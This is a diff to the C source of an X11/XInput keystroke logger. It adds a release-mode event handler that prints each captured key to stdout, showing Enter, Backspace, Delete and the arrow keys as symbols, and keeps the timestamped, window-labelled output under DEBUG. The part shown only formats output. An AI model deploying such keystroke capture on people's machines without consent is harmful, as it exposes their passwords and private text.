@@ -7,6 +7,9 @@
 #include <X11/XKBlib.h>
 #include <X11/extensions/XInput.h>
 
+#define XK_MISCELLANY
+#include <X11/keysymdef.h>
+
 static int KEY_PRESS_TYPE;
 
 struct keystroke_info
@@ -22,6 +25,61 @@ struct keystroke_info
     char* focused_window_name;
 };
 
+#ifndef DEBUG
+static void process_event( const struct keystroke_info *info )
+{
+    const char *out;
+
+    /* overload some special keystrokes */
+    switch ( info->original_keysym )
+    {
+    case XK_Return:
+    case XK_KP_Enter:
+        out = "\n";
+        break;
+
+    case XK_BackSpace:
+        out = "\u232b";
+        break;
+
+    case XK_Delete:
+        out = "\u2326";
+        break;
+
+    case XK_Left:
+    case XK_KP_Left:
+        out = "\u2190";
+        break;
+
+     case XK_Up:
+     case XK_KP_Up:
+        out = "\u2191";
+        break;
+
+    case XK_Right:
+    case XK_KP_Right:
+        out = "\u2192";
+        break;
+
+     case XK_Down:
+     case XK_KP_Down:
+        out = "\u2193";
+        break;
+
+    default:
+        /* use default translation */
+        if ( info->translation_available )
+        {
+            out = info->translated_char;
+        }
+        /* skip */
+        else return;
+    }
+
+    printf( "%s" , out );
+    fflush( stdout );
+}
+#else
 static void process_event( const struct keystroke_info *info )
 {
     char time_buf[ 20 ] = { 0 };
@@ -57,6 +115,7 @@ static void process_event( const struct keystroke_info *info )
     printf( "\n" );
     fflush( stdout );
 }
+#endif
 
 static int get_keybord_id( Display *display , XID *xid )
 {
